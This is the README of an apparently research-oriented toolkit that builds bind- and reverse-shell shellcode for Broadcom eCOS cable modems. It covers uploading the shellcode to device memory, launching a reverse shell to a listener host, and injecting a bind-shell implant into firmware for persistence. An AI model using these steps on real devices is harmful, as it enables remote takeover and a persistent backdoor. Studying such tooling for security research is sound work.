# eCOS Shellcodes

Shellcode generation for eCOS platform. Right now mostly focused on Broadcom eCOS platform (Broadcom Foundation Classes).

The following shellcodes are implemented:

- **sample** - launch a thread printing a character string on console every 5 seconds
- **bindshell** - a bind shell function (blocking)
- **bindshell\_thread** - a bind shell function launched within a dedicated thread
- **reverseshell** - a reverse shell function (blocking)
- **reverseshell\_thread** - a reverse shell function launched within a dedicated thread

## Toolchain Install

You need the mipsisa32-elf toolchain to generate shellcode for Broadcom eCOS platform. You can run `install.sh` to download it into the repo.


## Shellcode Generation

First, you need to extract all function offsets from your target's firmware and place them in the `payload.ld` file. Right now, two targets are defined:

- **CG3700** - Netgear CG3700
- **TCG300** - Askey TCG300/Siligence TCG300

Once done, just edit the PLATFORM parameter in `Makefile` so that the linker will take offsets from your file.

When done, you can generate shellcode with make commands:

```
make clean && make
rm -f *.elf *.bin
gnutools/mipsisa32-elf/bin/mipsisa32-elf-gcc sample.c -o sample.elf -march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T CG3700/payload.ld
gnutools/mipsisa32-elf/bin/mipsisa32-elf-objcopy -O binary -j .start -j .text -j .data -j .rodata sample.elf sample.bin
gnutools/mipsisa32-elf/bin/mipsisa32-elf-gcc reverseshell.c -o reverseshell.elf -march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T CG3700/payload.ld
gnutools/mipsisa32-elf/bin/mipsisa32-elf-objcopy -O binary -j .start -j .text -j .data -j .rodata reverseshell.elf reverseshell.bin
gnutools/mipsisa32-elf/bin/mipsisa32-elf-gcc reverseshell_thread.c -o reverseshell_thread.elf -march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T CG3700/payload.ld
gnutools/mipsisa32-elf/bin/mipsisa32-elf-objcopy -O binary -j .start -j .text -j .data -j .rodata reverseshell_thread.elf reverseshell_thread.bin
gnutools/mipsisa32-elf/bin/mipsisa32-elf-gcc bindshell.c -o bindshell.elf -march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T CG3700/payload.ld
gnutools/mipsisa32-elf/bin/mipsisa32-elf-objcopy -O binary -j .start -j .text -j .data -j .rodata bindshell.elf bindshell.bin
gnutools/mipsisa32-elf/bin/mipsisa32-elf-gcc bindshell_thread.c -o bindshell_thread.elf -march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T CG3700/payload.ld
gnutools/mipsisa32-elf/bin/mipsisa32-elf-objcopy -O binary -j .start -j .text -j .data -j .rodata bindshell_thread.elf bindshell_thread.bin
```

## Shellcode Write

The Broadcom eCOS platform expose `write_memory` and `read_memory` CLI functions that we can call to write our shellcode in RAM.

You can use the `upload.py` python script to write a given shellcode into a device memory over a serial connection.

```
./upload.py reverseshell.bin 0x80810000
[+] Writing payload to memory.
[+] Reading payload from memory.
[+] Integrity check passed.
```

Note that these functions can be called from different context (SSH session, telnet session, reverse shell session, ...). The script only supports serial at the moment, pull requests are welcomed though :)

## Shellcode Call

Once written into memory, we can call our shell code by relying on the `call` CLI function. The next subsections explain how to call each shellcode.

### bind shell

The shellcode takes two parameters:

- ip address to bind to
- tcp port to bind to

Parameters must be transmitted in hexadecimal notation.

```
CM> call func -r -a 0x80810000 0x00000000 0x115c
Calling function 0x80810000(0x00000000, 0x115c)
[+] Launching bind shell on 0.0.0.0:4444
```

### reverse shell

The shellcode takes two parameters:

- ip address to connect to
- tcp port to connect to

Parameters must be transmitted in hexadecimal notation.

```
CM> call func -r -a 0x80810000 0xc0a80003 0x115c
Calling function 0x80810000(0xc0a80003, 0x115c)
[+] Launching reverse shell to 192.168.0.3:4444
```

## eCOS Threading

Reverse and bind shells supports threading but it's not that interesting on Broadcom platform because the console I/O cannot be shared by multiple threads (no virtual tty like Linux).

This means that once you launch the (reverse/bind) shell thread, you lose access to the console if you were already connected to it via UART/Telnet/SSH. Note that once you quit the thread (e.g. by closing the reverse shell connection), the code takes care of re-assigning console I/O to the legit descriptor.

Threading is still super relevant for specific functions that don't need console I/O and that you can leave running in the background (network scanning, implant writing to backdoor bootloader/firmware, gdb server, ...).

## Firmware Implants (Persistence)

The `inject.py` script can be used to inject custom shellcode in an unpacked firmware file by overwriting a given section.

```
./inject.py firmware.bin ~/git/ecoshell/bindshell_thread.bin 0x805f4434 0x805f4b28
Available space: 1780 bytes
Overwriting firmware file with shellcode.
```

More details on persistence with firmware implants can be found in [Broadcom eCos | Gaining Persistence with Firmware Implants](https://ecos.wtf/2021/03/15/ecos-persistence-firmware)

## Credits

- Makefile and linker file inspired from [https://github.com/stdw/cm-sdr](https://github.com/stdw/cm-sdr)
- eCOS console command handler inspiration from early work on CableHaunt by [Lyrebirds](https://github.com/Lyrebirds/technicolor-tc7230-exploit/blob/master/reverseshell.c)
